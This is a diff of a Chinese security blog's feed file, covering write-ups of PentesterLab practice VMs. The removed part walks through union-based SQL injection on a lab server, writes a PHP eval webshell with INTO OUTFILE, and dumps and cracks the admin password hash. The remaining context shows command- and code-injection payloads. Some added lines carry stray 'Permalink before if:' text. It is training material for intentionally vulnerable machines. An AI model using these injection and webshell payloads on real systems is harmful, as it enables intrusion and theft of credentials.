-&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="n">mysql_fetch_assoc&lt;/span>&lt;span class="p">()&lt;/span> &lt;span class="n">expects&lt;/span> &lt;span class="n">parameter&lt;/span> &lt;span class="mi">1&lt;/span> &lt;span class="n">to&lt;/span> &lt;span class="n">be&lt;/span> &lt;span class="n">resource&lt;/span>&lt;span class="p">,&lt;/span> &lt;span class="n">boolean&lt;/span> &lt;span class="n">given&lt;/span> &lt;span class="ow">in&lt;/span> &lt;span class="o">/&lt;/span>&lt;span class="k">var&lt;/span>&lt;span class="o">/&lt;/span>&lt;span class="n">www&lt;/span>&lt;span class="o">/&lt;/span>&lt;span class="n">classes&lt;/span>&lt;span class="o">/&lt;/span>&lt;span class="n">post&lt;/span>&lt;span class="o">.&lt;/span>&lt;span class="n">php&lt;/span> &lt;span class="n">on&lt;/span> &lt;span class="n">line&lt;/span> &lt;span class="mi">111&lt;/span> &lt;span class="n">Notice&lt;/span>&lt;span class="p">:&lt;/span> &lt;span class="n">Undefined&lt;/span> &lt;span class="n">variable&lt;/span>&lt;span class="p">:&lt;/span> &lt;span class="n">post&lt;/span> &lt;span class="ow">in&lt;/span> &lt;span class="o">/&lt;/span>&lt;span class="k">var&lt;/span>&lt;span class="o">/&lt;/span>&lt;span class="n">www&lt;/span>&lt;span class="o">/&lt;/span>&lt;span class="n">classes&lt;/span>&lt;span class="o">/&lt;/span>&lt;span class="n">post&lt;/span>&lt;span class="o">.&lt;/span>&lt;span class="n">php&lt;/span> &lt;span class="n">on&lt;/span> &lt;span class="n">line&lt;/span> &lt;span class="mi">115&lt;/span>
-&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">
-&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="n">Notice&lt;/span>&lt;span class="p">:&lt;/span> &lt;span class="n">Trying&lt;/span> &lt;span class="n">to&lt;/span> &lt;span class="n">get&lt;/span> &lt;span class="n">property&lt;/span> &lt;span class="n">of&lt;/span> &lt;span class="n">non&lt;/span>&lt;span class="o">-&lt;/span>&lt;span class="n">object&lt;/span> &lt;span class="ow">in&lt;/span> &lt;span class="o">/&lt;/span>&lt;span class="k">var&lt;/span>&lt;span class="o">/&lt;/span>&lt;span class="n">www&lt;/span>&lt;span class="o">/&lt;/span>&lt;span class="n">admin&lt;/span>&lt;span class="o">/&lt;/span>&lt;span class="n">edit&lt;/span>&lt;span class="o">.&lt;/span>&lt;span class="n">php&lt;/span> &lt;span class="n">on&lt;/span> &lt;span class="n">line&lt;/span> &lt;span class="mi">19&lt;/span>
-&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/td>&lt;/tr>&lt;/table>
-&lt;/div>
-&lt;/div>&lt;p>继续 fuzz ，在&lt;code>1 union select 1,2,3,4%23&lt;/code>的时候回显正常，猜测有4列&lt;/p>
-&lt;p>通过&lt;code>id=1 union select 1,2,@@version,4 limit 1,1%23&lt;/code>，得到了在文本编辑框中的版本号，也通过&lt;code>user()&lt;/code>发现是&lt;code>root@localhost&lt;/code>的权限，想要拿到 shell ，自然先想怎么去写入 webshell&lt;/p>
-&lt;p>&lt;img src="https://blogpic.zdy.one/img/20190610004962.jpg"
-loading="lazy"
->&lt;/p>
-&lt;h3 id="getshell">GetShell
-&lt;/h3>&lt;p>查一下&lt;code>secure_file_priv&lt;/code>&lt;/p>
-&lt;div class="highlight">&lt;div class="chroma">
-&lt;table class="lntable">&lt;tr>&lt;td class="lntd">
-&lt;pre tabindex="0" class="chroma">&lt;code>&lt;span class="lnt">1
-&lt;/span>&lt;/code>&lt;/pre>&lt;/td>
-&lt;td class="lntd">
-&lt;pre tabindex="0" class="chroma">&lt;code class="language-sql" data-lang="sql">&lt;span class="line">&lt;span class="cl">&lt;span class="mi">1&lt;/span>&lt;span class="w"> &lt;/span>&lt;span class="k">union&lt;/span>&lt;span class="w"> &lt;/span>&lt;span class="k">SELECT&lt;/span>&lt;span class="w"> &lt;/span>&lt;span class="mi">1&lt;/span>&lt;span class="p">,&lt;/span>&lt;span class="o">@@&lt;/span>&lt;span class="n">secure_file_priv&lt;/span>&lt;span class="p">,&lt;/span>&lt;span class="mi">2&lt;/span>&lt;span class="p">,&lt;/span>&lt;span class="mi">3&lt;/span>&lt;span class="w"> &lt;/span>&lt;span class="k">limit&lt;/span>&lt;span class="w"> &lt;/span>&lt;span class="mi">1&lt;/span>&lt;span class="p">,&lt;/span>&lt;span class="mi">1&lt;/span>&lt;span class="o">%&lt;/span>&lt;span class="mi">23&lt;/span>&lt;span class="w">
-&lt;/span>&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/td>&lt;/tr>&lt;/table>
-&lt;/div>
-&lt;/div>&lt;p>发现为空，那就说明可以为所欲为了&lt;/p>
-&lt;p>&lt;img src="https://blogpic.zdy.one/img/20190610000440.jpg"
-loading="lazy"
->&lt;/p>
-&lt;p>通过&lt;/p>
-&lt;div class="highlight">&lt;div class="chroma">
-&lt;table class="lntable">&lt;tr>&lt;td class="lntd">
-&lt;pre tabindex="0" class="chroma">&lt;code>&lt;span class="lnt">1
-&lt;/span>&lt;/code>&lt;/pre>&lt;/td>
-&lt;td class="lntd">
-&lt;pre tabindex="0" class="chroma">&lt;code class="language-sql" data-lang="sql">&lt;span class="line">&lt;span class="cl">&lt;span class="mi">1&lt;/span>&lt;span class="w"> &lt;/span>&lt;span class="k">union&lt;/span>&lt;span class="w"> &lt;/span>&lt;span class="k">SELECT&lt;/span>&lt;span class="w"> &lt;/span>&lt;span class="s1">&amp;#39;&amp;lt;?php eval($_POST[zedd]);?&amp;gt;&amp;#39;&lt;/span>&lt;span class="p">,&lt;/span>&lt;span class="mi">2&lt;/span>&lt;span class="p">,&lt;/span>&lt;span class="mi">3&lt;/span>&lt;span class="p">,&lt;/span>&lt;span class="mi">4&lt;/span>&lt;span class="w"> &lt;/span>&lt;span class="k">INTO&lt;/span>&lt;span class="w"> &lt;/span>&lt;span class="n">OUTFILE&lt;/span>&lt;span class="w"> &lt;/span>&lt;span class="s1">&amp;#39;/var/www/zedd.php&amp;#39;&lt;/span>&lt;span class="o">%&lt;/span>&lt;span class="mi">23&lt;/span>&lt;span class="w">
-&lt;/span>&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/td>&lt;/tr>&lt;/table>
-&lt;/div>
-&lt;/div>&lt;p>这里按照之前 Pentestlab 的尿性写的&lt;code>/var/www&lt;/code>这个目录，但是一直写不进去，应该是没权限，然后想应该在一些静态文件夹那里应该会有写入的权限，于是写到了 images 文件夹下面。&lt;/p>
-&lt;div class="highlight">&lt;div class="chroma">
-&lt;table class="lntable">&lt;tr>&lt;td class="lntd">
-&lt;pre tabindex="0" class="chroma">&lt;code>&lt;span class="lnt">1
-&lt;/span>&lt;/code>&lt;/pre>&lt;/td>
-&lt;td class="lntd">
-&lt;pre tabindex="0" class="chroma">&lt;code class="language-sql" data-lang="sql">&lt;span class="line">&lt;span class="cl">&lt;span class="mi">1&lt;/span>&lt;span class="w"> &lt;/span>&lt;span class="k">union&lt;/span>&lt;span class="w"> &lt;/span>&lt;span class="k">SELECT&lt;/span>&lt;span class="w"> &lt;/span>&lt;span class="s1">&amp;#39;&amp;lt;?php eval($_POST[zedd]);?&amp;gt;&amp;#39;&lt;/span>&lt;span class="p">,&lt;/span>&lt;span class="mi">2&lt;/span>&lt;span class="p">,&lt;/span>&lt;span class="mi">3&lt;/span>&lt;span class="p">,&lt;/span>&lt;span class="mi">4&lt;/span>&lt;span class="w"> &lt;/span>&lt;span class="k">INTO&lt;/span>&lt;span class="w"> &lt;/span>&lt;span class="n">OUTFILE&lt;/span>&lt;span class="w"> &lt;/span>&lt;span class="s1">&amp;#39;/var/www/images/zedd.php&amp;#39;&lt;/span>&lt;span class="o">%&lt;/span>&lt;span class="mi">23&lt;/span>&lt;span class="w">
-&lt;/span>&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/td>&lt;/tr>&lt;/table>
-&lt;/div>
-&lt;/div>&lt;p>连上去就得到 webshell 了&lt;/p>
-&lt;h3 id="something-else">Something else
-&lt;/h3>&lt;p>其它一些 sql 操作&lt;/p>
-&lt;div class="highlight">&lt;div class="chroma">
-&lt;table class="lntable">&lt;tr>&lt;td class="lntd">
-&lt;pre tabindex="0" class="chroma">&lt;code>&lt;span class="lnt"> 1
-&lt;/span>&lt;span class="lnt"> 2
-&lt;/span>&lt;span class="lnt"> 3
-&lt;/span>&lt;span class="lnt"> 4
-&lt;/span>&lt;span class="lnt"> 5
-&lt;/span>&lt;span class="lnt"> 6
-&lt;/span>&lt;span class="lnt"> 7
-&lt;/span>&lt;span class="lnt"> 8
-&lt;/span>&lt;span class="lnt"> 9
-&lt;/span>&lt;span class="lnt">10
-&lt;/span>&lt;span class="lnt">11
-&lt;/span>&lt;/code>&lt;/pre>&lt;/td>
-&lt;td class="lntd">
-&lt;pre tabindex="0" class="chroma">&lt;code class="language-sql" data-lang="sql">&lt;span class="line">&lt;span class="cl">&lt;span class="mi">1&lt;/span>&lt;span class="w"> &lt;/span>&lt;span class="k">union&lt;/span>&lt;span class="w"> &lt;/span>&lt;span class="k">SELECT&lt;/span>&lt;span class="w"> &lt;/span>&lt;span class="mi">1&lt;/span>&lt;span class="p">,&lt;/span>&lt;span class="mi">2&lt;/span>&lt;span class="p">,&lt;/span>&lt;span class="n">group_concat&lt;/span>&lt;span class="p">(&lt;/span>&lt;span class="k">schema_name&lt;/span>&lt;span class="p">),&lt;/span>&lt;span class="mi">4&lt;/span>&lt;span class="w"> &lt;/span>&lt;span class="k">from&lt;/span>&lt;span class="w"> &lt;/span>&lt;span class="n">information_schema&lt;/span>&lt;span class="p">.&lt;/span>&lt;span class="n">schemata&lt;/span>&lt;span class="w"> &lt;/span>&lt;span class="k">limit&lt;/span>&lt;span class="w"> &lt;/span>&lt;span class="mi">1&lt;/span>&lt;span class="p">,&lt;/span>&lt;span class="mi">1&lt;/span>&lt;span class="o">%&lt;/span>&lt;span class="mi">23&lt;/span>&lt;span class="w">
-&lt;/span>&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="w">&lt;/span>&lt;span class="c1">-- information_schema,blog,mysql
-&lt;/span>&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="c1">&lt;/span>&lt;span class="w">
-&lt;/span>&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="w">&lt;/span>&lt;span class="mi">1&lt;/span>&lt;span class="w"> &lt;/span>&lt;span class="k">union&lt;/span>&lt;span class="w"> &lt;/span>&lt;span class="k">SELECT&lt;/span>&lt;span class="w"> &lt;/span>&lt;span class="mi">1&lt;/span>&lt;span class="p">,&lt;/span>&lt;span class="n">group_concat&lt;/span>&lt;span class="p">(&lt;/span>&lt;span class="k">table_name&lt;/span>&lt;span class="p">),&lt;/span>&lt;span class="mi">3&lt;/span>&lt;span class="p">,&lt;/span>&lt;span class="mi">4&lt;/span>&lt;span class="w"> &lt;/span>&lt;span class="k">from&lt;/span>&lt;span class="w"> &lt;/span>&lt;span class="n">information_schema&lt;/span>&lt;span class="p">.&lt;/span>&lt;span class="n">tables&lt;/span>&lt;span class="w"> &lt;/span>&lt;span class="k">where&lt;/span>&lt;span class="w"> &lt;/span>&lt;span class="n">table_schema&lt;/span>&lt;span class="o">=&lt;/span>&lt;span class="s1">&amp;#39;blog&amp;#39;&lt;/span>&lt;span class="w"> &lt;/span>&lt;span class="k">limit&lt;/span>&lt;span class="w"> &lt;/span>&lt;span class="mi">1&lt;/span>&lt;span class="p">,&lt;/span>&lt;span class="mi">1&lt;/span>&lt;span class="o">%&lt;/span>&lt;span class="mi">23&lt;/span>&lt;span class="w">
-&lt;/span>&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="w">&lt;/span>&lt;span class="c1">-- comments,posts,users
-&lt;/span>&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="c1">&lt;/span>&lt;span class="w">
-&lt;/span>&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="w">&lt;/span>&lt;span class="mi">1&lt;/span>&lt;span class="w"> &lt;/span>&lt;span class="k">union&lt;/span>&lt;span class="w"> &lt;/span>&lt;span class="k">SELECT&lt;/span>&lt;span class="w"> &lt;/span>&lt;span class="mi">1&lt;/span>&lt;span class="p">,&lt;/span>&lt;span class="n">group_concat&lt;/span>&lt;span class="p">(&lt;/span>&lt;span class="k">column_name&lt;/span>&lt;span class="p">),&lt;/span>&lt;span class="mi">3&lt;/span>&lt;span class="p">,&lt;/span>&lt;span class="mi">4&lt;/span>&lt;span class="w"> &lt;/span>&lt;span class="k">from&lt;/span>&lt;span class="w"> &lt;/span>&lt;span class="n">information_schema&lt;/span>&lt;span class="p">.&lt;/span>&lt;span class="n">columns&lt;/span>&lt;span class="w"> &lt;/span>&lt;span class="k">where&lt;/span>&lt;span class="w"> &lt;/span>&lt;span class="k">table_name&lt;/span>&lt;span class="o">=&lt;/span>&lt;span class="s1">&amp;#39;users&amp;#39;&lt;/span>&lt;span class="w"> &lt;/span>&lt;span class="k">limit&lt;/span>&lt;span class="w"> &lt;/span>&lt;span class="mi">1&lt;/span>&lt;span class="p">,&lt;/span>&lt;span class="mi">1&lt;/span>&lt;span class="o">%&lt;/span>&lt;span class="mi">23&lt;/span>&lt;span class="w">
-&lt;/span>&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="w">&lt;/span>&lt;span class="c1">-- id,login,password
-&lt;/span>&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="c1">&lt;/span>&lt;span class="w">
-&lt;/span>&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="w">&lt;/span>&lt;span class="mi">1&lt;/span>&lt;span class="w"> &lt;/span>&lt;span class="k">union&lt;/span>&lt;span class="w"> &lt;/span>&lt;span class="k">SELECT&lt;/span>&lt;span class="w"> &lt;/span>&lt;span class="mi">1&lt;/span>&lt;span class="p">,&lt;/span>&lt;span class="n">group_concat&lt;/span>&lt;span class="p">(&lt;/span>&lt;span class="n">login&lt;/span>&lt;span class="p">),&lt;/span>&lt;span class="n">group_concat&lt;/span>&lt;span class="p">(&lt;/span>&lt;span class="n">password&lt;/span>&lt;span class="p">),&lt;/span>&lt;span class="mi">4&lt;/span>&lt;span class="w"> &lt;/span>&lt;span class="k">from&lt;/span>&lt;span class="w"> &lt;/span>&lt;span class="n">users&lt;/span>&lt;span class="w"> &lt;/span>&lt;span class="k">limit&lt;/span>&lt;span class="w"> &lt;/span>&lt;span class="mi">1&lt;/span>&lt;span class="p">,&lt;/span>&lt;span class="mi">1&lt;/span>&lt;span class="o">%&lt;/span>&lt;span class="mi">23&lt;/span>&lt;span class="w">
-&lt;/span>&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="w">&lt;/span>&lt;span class="c1">-- admin/8efe310f9ab3efeae8d410a8e0166eb2
-&lt;/span>&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/td>&lt;/tr>&lt;/table>
-&lt;/div>
-&lt;/div>&lt;p>反查 md5 得到 admin 的密码是 P4ssw0rd&lt;/p>
-&lt;p>查看源代码文件可以看到除了&lt;code>find()&lt;/code>功能，其他功能都加上了&lt;code>mysql_real_escape_string&lt;/code>过滤&amp;hellip;&lt;/p>
-&lt;h2 id="conclusion">Conclusion
-&lt;/h2>&lt;p>虽然比较简单，但是整体做下来体验不是很好，尤其是 cookie 那里，很恶心…但是也是学会一点技巧吧&amp;hellip;还有就是文件路径那里，取巧了一下，因为之前系列 web 目录都是在&lt;code>/var/www&lt;/code>目录下，而不是&lt;code>/var/www/html&lt;/code>下。XSS 最好还是先用自己的服务器收 cookie …平台并不是完全可靠&lt;/p></description></item><item><title>Web For Pentest</title><link>https://zeddyu.github.io/p/web-for-pentest/</link><pubDate>Fri, 08 Mar 2019 23:31:42 +0000</pubDate><guid>https://zeddyu.github.io/p/web-for-pentest/</guid><description>&lt;p>很久之前就想做的靶机，一直没做，最近有空清理一下。地址在&lt;a class="link" href="https://pentesterlab.com/exercises?dir=desc&amp;amp;only=free&amp;amp;sort=published_at" target="_blank" rel="noopener"
+>Cross-site Scripting (XSS)&lt;/a>&lt;/p></description></item><item><title>Web For Pentest</title><link>https://zeddyu.github.io/p/web-for-pentest/</link><pubDate>Fri, 08 Mar 2019 23:31:42 +0000</pubDate><guid>https://zeddyu.github.io/p/web-for-pentest/</guid><description>&lt;p>很久之前就想做的靶机，一直没做，最近有空清理一下。地址在&lt;a class="link" href="https://pentesterlab.com/exercises?dir=desc&amp;amp;only=free&amp;amp;sort=published_at" target="_blank" rel="noopener"
 >PentestLab&lt;/a>&lt;/p>
 &lt;p>[TOC]&lt;/p>
 &lt;h2 id="pre">Pre
 &lt;/h2>&lt;p>下载得到一个 iso 后直接用 vmware 装起来，&lt;code>ifconfig&lt;/code>得到 ip ，访问就可以看到主页了&lt;/p>
-&lt;p>&lt;img src="https://blogpic.zdy.one/img/20190610000990.jpg"
-loading="lazy"
->&lt;/p>
 &lt;h2 id="hacking">Hacking
 &lt;/h2>&lt;h3 id="xss">XSS
 &lt;/h3>&lt;h4 id="example-1">Example 1
@@ -5413,7 +5285,7 @@ loading="lazy"
 &lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/td>&lt;/tr>&lt;/table>
 &lt;/div>
 &lt;/div>&lt;p>得到&lt;/p>
-&lt;p>&lt;img src="https://blogpic.zdy.one/img/20190610005160.jpg"
+&lt;p>Permalink before if: https://blogpic.zdy.one/img/20190610005160.jpg&lt;img src="https://blogpic.zdy.one/img/20190610005160.jpg"
 loading="lazy"
 >&lt;/p>
 &lt;h4 id="example-2-1">Example 2
@@ -5913,7 +5785,7 @@ loading="lazy"
 &lt;pre tabindex="0" class="chroma">&lt;code class="language-fallback" data-lang="fallback">&lt;span class="line">&lt;span class="cl">id,$b-&amp;gt;id);}system(&amp;#39;ls&amp;#39;);//
 &lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/td>&lt;/tr>&lt;/table>
 &lt;/div>
-&lt;/div>&lt;p>&lt;img src="https://blogpic.zdy.one/img/20190610003780.jpg"
+&lt;/div>&lt;p>Permalink before if: https://blogpic.zdy.one/img/20190610003780.jpg&lt;img src="https://blogpic.zdy.one/img/20190610003780.jpg"
 loading="lazy"
 >&lt;/p>
 &lt;h4 id="example-3-2">Example 3
@@ -5946,7 +5818,7 @@ loading="lazy"
 &lt;/div>
 &lt;/div>&lt;p>使用&lt;code>/e&lt;/code>修饰符，&lt;code>preg_replace&lt;/code>会将&lt;code>replacement&lt;/code>参数当作 PHP 代码执行，也就是&lt;code>$_GET['new']&lt;/code>&lt;/p>
 &lt;p>所以用&lt;code>new=system('id');&amp;amp;pattern=/test/e&amp;amp;base=jutst test&lt;/code>，即可执行任意命令。&lt;/p>
-&lt;p>&lt;img src="https://blogpic.zdy.one/img/20190610008506.jpg"
+&lt;p>Permalink before if: https://blogpic.zdy.one/img/20190610008506.jpg&lt;img src="https://blogpic.zdy.one/img/20190610008506.jpg"
 loading="lazy"
 >&lt;/p>
 &lt;h3 id="file-upload">File Upload
@@ -6024,7 +5896,7 @@ loading="lazy"
 &lt;/div>&lt;p>于是用&lt;code>%0a&lt;/code>换行执行命令&lt;/p>
 &lt;h4 id="example-3-4">Example 3
 &lt;/h4>&lt;p>直接在后面加貌似会被先过滤跳转，放到 burp 里面加就行了&lt;/p>
-&lt;p>&lt;img src="https://blogpic.zdy.one/img/20190610008206.jpg"
+&lt;p>Permalink before if: https://blogpic.zdy.one/img/20190610008206.jpg&lt;img src="https://blogpic.zdy.one/img/20190610008206.jpg"
 loading="lazy"
 >&lt;/p>
 &lt;p>看下源代码&lt;/p>
